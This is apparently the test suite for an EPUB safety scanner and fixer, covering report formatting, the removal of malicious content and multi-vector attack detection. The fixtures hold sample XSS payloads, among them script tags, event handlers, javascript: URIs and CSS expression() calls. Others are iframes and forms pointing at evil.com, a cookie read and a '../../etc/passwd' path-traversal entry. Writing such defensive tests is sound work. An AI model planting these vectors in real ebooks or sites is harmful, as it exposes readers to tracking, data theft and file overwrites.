        results = [ScanResult(epub_path="clean.epub")]
        md = format_report_md(results)
        assert "CLEAN" in md
        assert "`clean.epub`" in md
        assert "No threats detected" in md

    def test_report_error_file(self):
        results = [ScanResult(epub_path="bad.epub", error="Invalid ZIP")]
        md = format_report_md(results)
        assert "ERROR" in md
        assert "`bad.epub`" in md
        assert "Invalid ZIP" in md

    def test_report_findings_detail(self):
        results = [
            ScanResult(
                epub_path="evil.epub",
                findings=[
                    Finding(
                        Severity.CRITICAL, "JavaScript", "ch1.xhtml", "script tag detected", "<script>alert(1)</script>"
                    ),
                    Finding(Severity.WARNING, "External Resource", "ch2.xhtml", "External resource loaded via src"),
                ],
            )
        ]
        md = format_report_md(results)
        assert "### JavaScript" in md
        assert "### External Resource" in md
        assert "`ch1.xhtml`" in md
        assert "script tag detected" in md
        assert "`ch2.xhtml`" in md
        assert "**[CRITICAL]**" in md
        assert "**[WARNING]**" in md
        assert "Evidence: `<script>alert(1)</script>`" in md

    def test_report_summary_table(self):
        results = [
            ScanResult(epub_path="clean.epub"),
            ScanResult(
                epub_path="evil.epub",
                findings=[
                    Finding(Severity.CRITICAL, "JS", "f.xhtml", "script tag"),
                ],
            ),
            ScanResult(epub_path="bad.epub", error="corrupt"),
        ]
        md = format_report_md(results)
        assert "| Status | File |" in md
        assert "**Findings**: 1 critical" in md
        assert "**Clean**: 1" in md
        assert "**Errors**: 1" in md

    def test_report_multi_file_counts(self):
        results = [
            ScanResult(
                epub_path="a.epub",
                findings=[
                    Finding(Severity.CRITICAL, "JS", "f.xhtml", "test"),
                    Finding(Severity.WARNING, "CSS", "f.css", "test"),
                ],
            ),
            ScanResult(
                epub_path="b.epub",
                findings=[
                    Finding(Severity.INFO, "Link", "f.xhtml", "test"),
                ],
            ),
        ]
        md = format_report_md(results)
        assert "1 critical" in md
        assert "1 warning" in md
        # INFO hidden by default
        assert "info" not in md.lower().split("findings")[1].split("\n")[0]

    def test_report_verbose_shows_info(self):
        results = [
            ScanResult(
                epub_path="b.epub",
                findings=[
                    Finding(Severity.INFO, "External Link", "ch1.xhtml", "External link: https://example.com"),
                ],
            ),
        ]
        md = format_report_md(results, verbose=True)
        assert "1 info" in md
        assert "### External Link" in md
        assert "`ch1.xhtml`" in md

    def test_report_default_hides_info(self):
        results = [
            ScanResult(
                epub_path="b.epub",
                findings=[
                    Finding(Severity.INFO, "External Link", "ch1.xhtml", "External link: https://example.com"),
                ],
            ),
        ]
        md = format_report_md(results)
        assert "### External Link" not in md

    def test_report_cli_writes_file(self, monkeypatch):
        """--report flag should write a .md file."""
        tmpdir = tempfile.mkdtemp()
        try:
            make_epub(
                {"ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><script>xss</script></body></html>'},
                os.path.join(tmpdir, "test.epub"),
            )
            report_path = os.path.join(tmpdir, "report.md")
            monkeypatch.setattr(
                "sys.argv",
                [
                    "scanner",
                    "--path",
                    tmpdir,
                    "--no-color",
                    "--report",
                    report_path,
                ],
            )
            main()

            assert os.path.exists(report_path)
            content = Path(report_path).read_text(encoding="utf-8")
            assert "# EPUB Safety Scanner Report" in content
            assert "`test.epub`" in content
            assert "script tag" in content
        finally:
            for f in Path(tmpdir).glob("*"):
                f.unlink()
            os.rmdir(tmpdir)

    def test_no_report_without_flag(self, capsys, monkeypatch):
        """Without --report, no file should be written."""
        tmpdir = tempfile.mkdtemp()
        try:
            make_epub(
                {"ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>ok</p></body></html>'},
                os.path.join(tmpdir, "book.epub"),
            )
            monkeypatch.setattr("sys.argv", ["scanner", "--path", tmpdir, "--no-color"])
            main()
            output = capsys.readouterr().out
            assert "Report saved to" not in output
        finally:
            for f in Path(tmpdir).glob("*"):
                f.unlink()
            os.rmdir(tmpdir)


# ── EPUB Fixer Tests ─────────────────────────────────────────────────────────


class TestEPUBFixer:
    """Tests for the EPUB fixer that removes malicious content."""

    def _fix_epub(self, files):
        """Helper: create EPUB, fix it, return (FixResult, fixed_epub_content_dict)."""
        tmpdir = tempfile.mkdtemp()
        epub_path = make_epub(files, os.path.join(tmpdir, "test.epub"))
        fixer = EPUBFixer()
        fix_result = fixer.fix(epub_path)
        fixed_contents = {}
        if fix_result.fixed_path and Path(fix_result.fixed_path).exists():
            with zipfile.ZipFile(fix_result.fixed_path, "r") as zf:
                for name in zf.namelist():
                    fixed_contents[name] = zf.read(name)
        # cleanup
        for f in Path(tmpdir).glob("*"):
            f.unlink()
        os.rmdir(tmpdir)
        return fix_result, fixed_contents

    def test_removes_js_files(self):
        result, contents = self._fix_epub(
            {
                "ch1.xhtml": '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>ok</p></body></html>',
                "scripts/evil.js": "alert(1);",
            }
        )
        assert "scripts/evil.js" in result.removed_files
        assert "scripts/evil.js" not in contents

    def test_removes_exe_files(self):
        result, contents = self._fix_epub(
            {
                "payload.exe": b"MZ" + b"\x00" * 100,
            }
        )
        assert "payload.exe" in result.removed_files
        assert "payload.exe" not in contents

    def test_removes_nested_archives(self):
        result, contents = self._fix_epub(
            {
                "data.zip": b"PK\x03\x04" + b"\x00" * 100,
            }
        )
        assert "data.zip" in result.removed_files

    def test_removes_path_traversal(self):
        """Entries with ../ should be removed."""
        tmpdir = tempfile.mkdtemp()
        epub_path = os.path.join(tmpdir, "traversal.epub")
        with zipfile.ZipFile(epub_path, "w") as zf:
            zf.writestr("mimetype", "application/epub+zip")
            zf.writestr("../../etc/passwd", "root:x:0:0:")
            zf.writestr("ch1.xhtml", '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>ok</p></body></html>')
        fixer = EPUBFixer()
        result = fixer.fix(epub_path)
        assert "../../etc/passwd" in result.removed_files
        if result.fixed_path:
            with zipfile.ZipFile(result.fixed_path, "r") as zf:
                assert "../../etc/passwd" not in zf.namelist()
            Path(result.fixed_path).unlink()
        Path(epub_path).unlink()
        os.rmdir(tmpdir)

    def test_strips_script_tags(self):
        result, contents = self._fix_epub(
            {
                "ch1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    "<body><p>hello</p><script>alert('xss')</script></body></html>"
                ),
            }
        )
        assert "ch1.xhtml" in result.sanitized_files
        fixed_html = contents["ch1.xhtml"].decode()
        assert "<script" not in fixed_html
        assert "alert" not in fixed_html
        assert "<p>hello</p>" in fixed_html

    def test_strips_event_handlers(self):
        result, contents = self._fix_epub(
            {
                "ch1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><div onclick="alert(1)" class="box">text</div></body></html>'
                ),
            }
        )
        fixed_html = contents["ch1.xhtml"].decode()
        assert "onclick" not in fixed_html
        assert 'class="box"' in fixed_html
        assert "text" in fixed_html

    def test_neutralizes_javascript_uri(self):
        result, contents = self._fix_epub(
            {
                "ch1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><a href="javascript:alert(1)">click</a></body></html>'
                ),
            }
        )
        fixed_html = contents["ch1.xhtml"].decode()
        assert "javascript:" not in fixed_html
        assert 'href="#"' in fixed_html

    def test_strips_iframe(self):
        result, contents = self._fix_epub(
            {
                "ch1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><p>before</p><iframe src="https://evil.com"></iframe><p>after</p></body></html>'
                ),
            }
        )
        fixed_html = contents["ch1.xhtml"].decode()
        assert "<iframe" not in fixed_html
        assert "<p>before</p>" in fixed_html
        assert "<p>after</p>" in fixed_html

    def test_strips_applet(self):
        result, contents = self._fix_epub(
            {
                "ch1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><applet code="Evil.class">x</applet></body></html>'
                ),
            }
        )
        fixed_html = contents["ch1.xhtml"].decode()
        assert "<applet" not in fixed_html

    def test_strips_meta_refresh(self):
        result, contents = self._fix_epub(
            {
                "ch1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<head><meta http-equiv="refresh" content="0;url=https://evil.com"/></head>'
                    "<body/></html>"
                ),
            }
        )
        fixed_html = contents["ch1.xhtml"].decode()
        assert "refresh" not in fixed_html

    def test_sanitizes_css_expression(self):
        result, contents = self._fix_epub(
            {
                "style.css": "body { width: expression(alert(1)); color: red; }",
            }
        )
        assert "style.css" in result.sanitized_files
        fixed_css = contents["style.css"].decode()
        assert "expression" not in fixed_css
        assert "color: red" in fixed_css

    def test_sanitizes_css_moz_binding(self):
        result, contents = self._fix_epub(
            {
                "style.css": "body { -moz-binding: url('evil.xml#xss'); }",
            }
        )
        fixed_css = contents["style.css"].decode()
        assert "-moz-binding" not in fixed_css

    def test_sanitizes_css_in_style_tag(self):
        result, contents = self._fix_epub(
            {
                "ch1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    "<head><style>body { width: expression(alert(1)); }</style></head>"
                    "<body/></html>"
                ),
            }
        )
        fixed_html = contents["ch1.xhtml"].decode()
        assert "expression" not in fixed_html
        assert "<style>" in fixed_html

    def test_sanitizes_css_in_style_attr(self):
        result, contents = self._fix_epub(
            {
                "ch1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><div style="width: expression(alert(1))">x</div></body></html>'
                ),
            }
        )
        fixed_html = contents["ch1.xhtml"].decode()
        assert "expression" not in fixed_html

    def test_removes_external_src(self):
        result, contents = self._fix_epub(
            {
                "ch1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><img src="https://evil.com/track.gif" alt="pic"/></body></html>'
                ),
            }
        )
        fixed_html = contents["ch1.xhtml"].decode()
        assert "https://evil.com" not in fixed_html
        assert 'alt="pic"' in fixed_html

    def test_preserves_external_href(self):
        """<a href="https://..."> is normal in ebooks and should NOT be removed."""
        result, contents = self._fix_epub(
            {
                "ch1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><a href="https://example.com">link</a></body></html>'
                ),
            }
        )
        # href-only EPUB has no fixable threats, so no fixed file is created
        assert not result.has_changes

    def test_preserves_href_while_removing_src(self):
        """Fix should remove src but keep <a href>."""
        result, contents = self._fix_epub(
            {
                "ch1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><img src="https://evil.com/track.gif"/>'
                    '<a href="https://example.com">link</a></body></html>'
                ),
            }
        )
        fixed_html = contents["ch1.xhtml"].decode()
        assert "https://evil.com" not in fixed_html
        assert 'href="https://example.com"' in fixed_html

    def test_removes_external_form_action(self):
        result, contents = self._fix_epub(
            {
                "ch1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<body><form action="https://evil.com/steal"><input/></form></body></html>'
                ),
            }
        )
        fixed_html = contents["ch1.xhtml"].decode()
        assert "https://evil.com" not in fixed_html

    def test_removes_css_external_url(self):
        result, contents = self._fix_epub(
            {
                "style.css": "body { background: url('https://evil.com/pixel.gif'); color: red; }",
            }
        )
        fixed_css = contents["style.css"].decode()
        assert "https://evil.com" not in fixed_css
        assert "color: red" in fixed_css

    def test_removes_css_external_import(self):
        result, contents = self._fix_epub(
            {
                "style.css": "@import url('https://evil.com/track.css');\nbody { color: red; }",
            }
        )
        fixed_css = contents["style.css"].decode()
        assert "https://evil.com" not in fixed_css
        assert "color: red" in fixed_css

    def test_clean_epub_no_fix_needed(self):
        result, contents = self._fix_epub(
            {
                "ch1.xhtml": ('<html xmlns="http://www.w3.org/1999/xhtml"><body><p>clean content</p></body></html>'),
            }
        )
        assert not result.has_changes
        assert result.fixed_path == ""

    def test_fixed_filename_prefix(self):
        tmpdir = tempfile.mkdtemp()
        epub_path = make_epub(
            {"evil.js": "alert(1);"},
            os.path.join(tmpdir, "my book.epub"),
        )
        fixer = EPUBFixer()
        result = fixer.fix(epub_path)
        assert Path(result.fixed_path).name == "[fixed] my book.epub"
        # cleanup
        for f in Path(tmpdir).glob("*"):
            f.unlink()
        os.rmdir(tmpdir)

    def test_fixed_epub_passes_scan(self):
        """The fixed EPUB should pass a scan with no CRITICAL findings."""
        tmpdir = tempfile.mkdtemp()
        epub_path = make_epub(
            {
                "ch1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    "<body><script>alert(1)</script>"
                    '<iframe src="x"></iframe>'
                    '<div onclick="evil()">text</div></body></html>'
                ),
                "evil.js": "alert(1);",
                "payload.exe": b"MZ" + b"\x00" * 100,
                "style.css": "body { width: expression(alert(1)); }",
            },
            os.path.join(tmpdir, "dangerous.epub"),
        )
        fixer = EPUBFixer()
        fix_result = fixer.fix(epub_path)
        assert fix_result.has_changes

        # Scan the fixed EPUB — should have no CRITICAL findings
        scanner = EPUBScanner()
        scan_results = scanner.scan(fix_result.fixed_path)
        assert len(scan_results) == 1
        assert scan_results[0].critical_count == 0, (
            f"Fixed EPUB still has critical findings: "
            f"{[f.description for f in scan_results[0].findings if f.severity == Severity.CRITICAL]}"
        )
        # cleanup
        for f in Path(tmpdir).glob("*"):
            f.unlink()
        os.rmdir(tmpdir)

    def test_fix_cli_flag(self, capsys, monkeypatch):
        """--fix flag should create fixed EPUBs."""
        tmpdir = tempfile.mkdtemp()
        try:
            make_epub(
                {
                    "evil.js": "alert(1);",
                    "ch1.xhtml": (
                        '<html xmlns="http://www.w3.org/1999/xhtml"><body><script>xss</script></body></html>'
                    ),
                },
                os.path.join(tmpdir, "bad.epub"),
            )
            monkeypatch.setattr(
                "sys.argv",
                [
                    "scanner",
                    "--path",
                    tmpdir,
                    "--no-color",
                    "--fix",
                ],
            )
            main()
            output = capsys.readouterr().out

            assert "FIXED" in output
            assert "[fixed] bad.epub" in output
            assert Path(os.path.join(tmpdir, "[fixed] bad.epub")).exists()
        finally:
            for f in Path(tmpdir).glob("*"):
                f.unlink()
            os.rmdir(tmpdir)


# ── Combined Attack Tests ────────────────────────────────────────────────────


class TestCombinedAttacks:
    """Tests for EPUBs with multiple attack vectors."""

    def test_multi_vector_attack(self):
        """EPUB with JS, malicious HTML, and suspicious files."""
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    '<head><style>body{-moz-binding:url("x.xml#xss")}</style></head>'
                    "<body>"
                    "<script>document.cookie</script>"
                    '<iframe src="https://evil.com"></iframe>'
                    '<img onerror="alert(1)" src="x"/>'
                    "</body></html>"
                ),
                "evil.exe": b"MZ" + b"\x00" * 100,
                "payload.zip": b"PK\x03\x04" + b"\x00" * 100,
            }
        )
        assert result.critical_count >= 3
        assert has_finding(result, Severity.CRITICAL, "JavaScript")
        assert has_finding(result, Severity.CRITICAL, "Malicious HTML", "iframe")
        assert has_finding(result, Severity.CRITICAL, "Dangerous File")

    def test_subtle_xss_epub(self):
        """EPUB that looks normal but has subtle XSS vectors."""
        result = scan_epub_with_files(
            {
                "chapter1.xhtml": (
                    '<html xmlns="http://www.w3.org/1999/xhtml">'
                    "<body>"
                    '<a href="javascript:void(0)">innocent link</a>'
                    "</body></html>"
                ),
                "style.css": (
                    "/* normal looking CSS */\n"
                    "body { font-family: serif; }\n"
                    "p { color: #333; }\n"
                    ".hidden { background: url('https://evil.com/pixel.gif'); }\n"
                ),
            }
        )
        assert has_finding(result, Severity.CRITICAL, "JavaScript", "javascript:")
        assert has_finding(result, Severity.WARNING, "Malicious CSS", "external url()")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
